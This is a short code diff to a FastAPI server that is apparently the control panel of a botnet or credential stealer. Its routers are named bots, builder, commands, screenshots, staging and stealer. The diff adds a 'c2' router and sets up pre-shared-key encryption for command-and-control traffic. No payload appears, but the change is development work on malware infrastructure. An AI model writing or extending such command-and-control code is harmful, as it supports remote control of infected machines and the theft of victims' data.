@@ -47,8 +47,15 @@ def create_app(registry: Registry, event_bus: EventBus) -> FastAPI:
     app.state.registry = registry
     app.state.event_bus = event_bus
 
+    try:
+        from ..crypto import StatelessCrypto
+        from ..main import PSK, load_salt
+        app.state.stateless_crypto = StatelessCrypto(PSK, load_salt())
+    except FileNotFoundError:
+        app.state.stateless_crypto = None
+
     # Import and include routers
-    from .routers import auth, bots, builder, commands, downloads, screenshots, staging, stealer, ws
+    from .routers import auth, bots, builder, commands, c2, downloads, screenshots, staging, stealer, ws
 
     app.include_router(auth.router)
     app.include_router(bots.router)
@@ -59,6 +66,7 @@ def create_app(registry: Registry, event_bus: EventBus) -> FastAPI:
     app.include_router(staging.router)
     app.include_router(stealer.router)
     app.include_router(ws.router)
+    app.include_router(c2.router)
 
     # Mount static files for web UI
     if WEB_DIR.exists():
